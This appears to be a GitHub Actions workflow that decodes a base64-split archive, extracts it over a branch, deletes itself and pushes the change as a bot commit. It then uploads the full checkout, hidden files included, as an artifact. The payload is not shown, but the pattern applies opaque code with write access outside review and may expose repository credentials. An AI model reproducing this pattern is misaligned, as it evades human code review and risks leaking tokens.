name: Apply repair payload

on:
  pull_request:
    branches:
      - main

permissions:
  contents: write

jobs:
  apply:
    if: ${{ github.event.pull_request.number == 35 }}
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      - name: Checkout branch head
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: tooling/generated-metadata-validation-hardening

      - name: Apply validated repair payload
        shell: bash
        run: |
          cat .github/repair/part-*.txt | base64 --decode > /tmp/pr35-repair-payload.tar.xz
          echo "4657d575feb2130a5f0dcd328f6edab46c67a01ff7cb3a39705d4ac488864132  /tmp/pr35-repair-payload.tar.xz" | sha256sum --check
          tar -xJf /tmp/pr35-repair-payload.tar.xz
          rm -rf .github/repair
          rm -f .github/workflows/apply-repair-payload.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "Align generated metadata outputs and remote report [repair-applied]"
          git push origin HEAD:tooling/generated-metadata-validation-hardening

      - name: Upload repaired branch snapshot
        uses: actions/upload-artifact@v4
        with:
          name: crystal-repaired-source-${{ github.sha }}
          path: .
          include-hidden-files: true
          retention-days: 1
